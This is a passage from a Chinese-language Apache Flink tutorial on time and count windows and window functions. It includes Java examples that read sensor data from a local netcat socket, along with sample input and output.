</li></ul><p><em>DataStream的</em><code>_windowAll()_</code><em>类似分区的global操作，这个操作是non-parallel的(并行度强行为1)，所有的数据都会被传递到同一个算子operator上，官方建议如果非必要就不要用这个API</em></p><h5 id="TimeWindow"><a href="#TimeWindow" class="headerlink" title="TimeWindow"></a>TimeWindow</h5><pre><code>TimeWindow将指定时间范围内的所有数据组成一个window，一次对一个window里面的所有数据进行计算。</code></pre><h6 id="滚动窗口"><a href="#滚动窗口" class="headerlink" title="滚动窗口"></a>滚动窗口</h6><pre><code>Flink默认的时间窗口根据ProcessingTime进行窗口的划分，将Flink获取到的数据根据进入Flink的时间划分到不同的窗口中。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Tuple2&lt;String, Double&gt;&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .map(<span class="keyword">new</span> MapFunction&lt;SensorReading, Tuple2&lt;String, Double&gt;&gt;() &#123; </span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Double&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), value.getTemperature()); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;) </span><br><span class="line">  .keyBy(data -&gt; data.f0) </span><br><span class="line">  .timeWindow( Time.seconds(<span class="number">15</span>) ) </span><br><span class="line">  .minBy(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><pre><code>时间间隔可以通过`Time.milliseconds(x)`，`Time.seconds(x)`，`Time.minutes(x)`等其中的一个来指定。</code></pre><h6 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h6><pre><code>滑动窗口和滚动窗口的函数名是完全一致的，只是在传参数时需要传入两个参数，一个是window_size，一个是sliding_size。下面代码中的sliding_size设置为了5s，也就是说，每5s就计算输出结果一次，每一次计算的window范围是15s内的所有元素。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .keyBy(SensorReading::getId) </span><br><span class="line">  .timeWindow( Time.seconds(<span class="number">15</span>), Time.seconds(<span class="number">5</span>) ) </span><br><span class="line">  .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br></pre></td></tr></table></figure><pre><code>时间间隔可以通过`Time.milliseconds(x)`，`Time.seconds(x)`，`Time.minutes(x)`等其中的一个来指定。</code></pre><h5 id="CountWindow"><a href="#CountWindow" class="headerlink" title="CountWindow"></a>CountWindow</h5><pre><code>CountWindow根据窗口中相同key元素的数量来触发执行，执行时只计算元素数量达到窗口大小的key对应的结果。**注意：CountWindow的window_size指的是相同Key的元素的个数，不是输入的所有元素的总数。**</code></pre><h6 id="滚动窗口-1"><a href="#滚动窗口-1" class="headerlink" title="滚动窗口"></a>滚动窗口</h6><pre><code>默认的CountWindow是一个滚动窗口，只需要指定窗口大小即可，**当元素数量达到窗口大小时，就会触发窗口的执行**。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .keyBy(SensorReading::getId) </span><br><span class="line">  .countWindow( <span class="number">5</span> ) </span><br><span class="line">  .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br></pre></td></tr></table></figure><h6 id="滑动窗口-1"><a href="#滑动窗口-1" class="headerlink" title="滑动窗口"></a>滑动窗口</h6><pre><code>滑动窗口和滚动窗口的函数名是完全一致的，只是在传参数时需要传入两个参数，一个是window_size，一个是sliding_size。下面代码中的sliding_size设置为了2，也就是说，每收到两个相同key的数据就计算一次，每一次计算的window范围是10个元素。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .keyBy(SensorReading::getId) </span><br><span class="line">  .countWindow( <span class="number">10</span>, <span class="number">2</span> ) </span><br><span class="line">  .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="window-function"><a href="#window-function" class="headerlink" title="window function"></a>window function</h5><p>window function 定义了要对窗口中收集的数据做的计算操作，主要可以分为两类：</p><ul><li>增量聚合函数（incremental aggregation functions）</li><li>全窗口函数（full window functions）</li></ul><h6 id="增量聚合函数"><a href="#增量聚合函数" class="headerlink" title="增量聚合函数"></a>增量聚合函数</h6><ul><li><strong>每条数据到来就进行计算</strong>，保持一个简单的状态。（来一条处理一条，但是不输出，到窗口临界位置才输出）</li><li>典型的增量聚合函数有ReduceFunction, AggregateFunction。</li></ul><h6 id="全窗口函数"><a href="#全窗口函数" class="headerlink" title="全窗口函数"></a>全窗口函数</h6><ul><li><strong>先把窗口所有数据收集起来，等到计算的时候会遍历所有数据</strong>。（来一个放一个，窗口临界位置才遍历且计算、输出）</li><li>ProcessWindowFunction，WindowFunction。</li></ul><h5 id="其它可选API"><a href="#其它可选API" class="headerlink" title="其它可选API"></a>其它可选API</h5><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106359443">Flink-Window概述 | Window类型 | TimeWindow、CountWindow、SessionWindow、WindowFunction</a></p></blockquote><ul><li> <code>.trigger()</code> ——触发器<br>定义window 什么时候关闭，触发计算并输出结果 </li><li> <code>.evitor()</code> ——移除器<br>定义移除某些数据的逻辑 </li><li> <code>.allowedLateness()</code> ——允许处理迟到的数据 </li><li> <code>.sideOutputLateData()</code> ——将迟到的数据放入侧输出流 </li><li> <code>.getSideOutput()</code> ——获取侧输出流 </li></ul><p><img src="https://img-blog.csdnimg.cn/20200526181340668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=f65qz&originHeight=435&originWidth=781&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h5><blockquote><p><a href="https://www.cnblogs.com/yangshibiao/p/14133628.html">Flink之Window的使用（2）：时间窗口</a></p></blockquote><ol><li> 测试滚动时间窗口的<strong>增量聚合函数</strong><br>增量聚合函数，特点即每次数据过来都处理，但是<strong>到了窗口临界才输出结果</strong>。 </li></ol><ul><li><p> 编写java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 7:14 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest1_TimeWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 并行度设置1，方便看结果</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        // 从文件读取数据</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;String&gt; dataStream = env.readTextFile(&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从socket文本流获取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开窗测试</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 增量聚合函数 (这里简单统计每个key组里传感器信息的总数)</span></span><br><span class="line">    DataStream&lt;Integer&gt; resultStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      <span class="comment">//                .countWindow(10, 2);</span></span><br><span class="line">      <span class="comment">//                .window(EventTimeSessionWindows.withGap(Time.minutes(1)));</span></span><br><span class="line">      <span class="comment">//                .window(TumblingProcessingTimeWindows.of(Time.seconds(15)))</span></span><br><span class="line">      <span class="comment">//                .timeWindow(Time.seconds(15)) // 已经不建议使用@Deprecated</span></span><br><span class="line">      .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">15</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> AggregateFunction&lt;SensorReading, Integer, Integer&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建的累加器</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每个数据在上次的基础上累加</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">add</span><span class="params">(SensorReading value, Integer accumulator)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回结果值</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">getResult</span><span class="params">(Integer accumulator)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> accumulator;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分区合并结果(TimeWindow一般用不到，SessionWindow可能需要考虑合并)</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">merge</span><span class="params">(Integer a, Integer b)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> a + b;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 本地开启socket服务  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>启动Flink程序，在socket窗口输入数据 </p><ul><li><p> 输入(下面用“换行”区分每个15s内的输入，实际输入时无换行)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line"></span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line"></span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li><li><p> 输出（下面用“换行”区分每个15s内的输出，实际输出无换行）<br><em>因为代码实现每15s一个window，所以”sensor_1”中间一组才累计2，最初一次不累计，最后一次也是另外的window，重新从1计数。</em>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">result&gt; 1</span><br><span class="line">result&gt; 1</span><br><span class="line"></span><br><span class="line">result&gt; 1</span><br><span class="line">result&gt; 1</span><br><span class="line">result&gt; 2</span><br><span class="line"></span><br><span class="line">result&gt; 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><ol start="2"><li> 测试滚动时间窗口的<strong>全窗口函数</strong><br>全窗口函数，特点即数据过来先不处理，等到窗口临界再遍历、计算、输出结果。 </li></ol><ul><li><p> 编写java测试代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.IteratorUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 7:14 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest1_TimeWindow</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 并行度设置1，方便看结果</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 从文件读取数据</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; dataStream = env.readTextFile(&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从socket文本流获取数据</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 全窗口函数 （WindowFunction和ProcessWindowFunction，后者更全面）</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple3&lt;String, Long, Integer&gt;&gt; resultStream2 = dataStream.keyBy(SensorReading::getId)</span><br><span class="line">                .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">15</span>)))</span><br><span class="line"><span class="comment">//                .process(new ProcessWindowFunction&lt;SensorReading, Object, Tuple, TimeWindow&gt;() &#123;</span></span><br><span class="line"><span class="comment">//                &#125;)</span></span><br><span class="line">                .apply(<span class="keyword">new</span> WindowFunction&lt;SensorReading, Tuple3&lt;String, Long, Integer&gt;, String, TimeWindow&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String s, TimeWindow window, Iterable&lt;SensorReading&gt; input, Collector&lt;Tuple3&lt;String, Long, Integer&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        String id = s;</span><br><span class="line">                        <span class="keyword">long</span> windowEnd = window.getEnd();</span><br><span class="line">                        <span class="keyword">int</span> count = IteratorUtils.toList(input.iterator()).size();</span><br><span class="line">                        out.collect(<span class="keyword">new</span> Tuple3&lt;&gt;(id, windowEnd, count));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        resultStream2.print(<span class="string">&quot;result2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动本地socket  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>在本地socket输入，查看Flink输出结果 </p><ul><li><p> 输入（以“空行”表示每个15s时间窗口内的输入，实际没有“空行”）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line"></span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br></pre></td></tr></table></figure></li><li><p> 输出（以“空行”表示每个15s时间窗口内的输入，实际没有“空行”）<br><em>这里每个window都是分开计算的，所以第一个window里的sensor_1和第二个window里的sensor_1并没有累计。</em>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result2&gt; (sensor_1,1612190820000,1)</span><br><span class="line">result2&gt; (sensor_6,1612190820000,1)</span><br><span class="line"></span><br><span class="line">result2&gt; (sensor_7,1612190835000,1)</span><br><span class="line">result2&gt; (sensor_1,1612190835000,2)</span><br><span class="line">result2&gt; (sensor_10,1612190835000,1)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ol start="3"><li> 测试滑动计数窗口的<strong>增量聚合函数</strong><br>滑动窗口，当窗口不足设置的大小时，会先按照步长输出。<br>eg：窗口大小10，步长2，那么前5次输出时，窗口内的元素个数分别是（2，4，6，8，10），再往后就是10个为一个窗口了。 </li></ol><ul><li><p> 编写java代码：<br>这里获取每个窗口里的温度平均值  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 11:03 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest2_CountWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 并行度设置1，方便看结果</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从socket文本流获取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    DataStream&lt;Double&gt; resultStream = dataStream.keyBy(SensorReading::getId)</span><br><span class="line">      .countWindow(<span class="number">10</span>, <span class="number">2</span>)</span><br><span class="line">      .aggregate(<span class="keyword">new</span> MyAvgFunc());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAvgFunc</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">Double</span>, <span class="title">Integer</span>&gt;, <span class="title">Double</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="number">0.0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">add</span><span class="params">(SensorReading value, Tuple2&lt;Double, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 温度累加求和，当前统计的温度个数+1</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(accumulator.f0 + value.getTemperature(), accumulator.f1 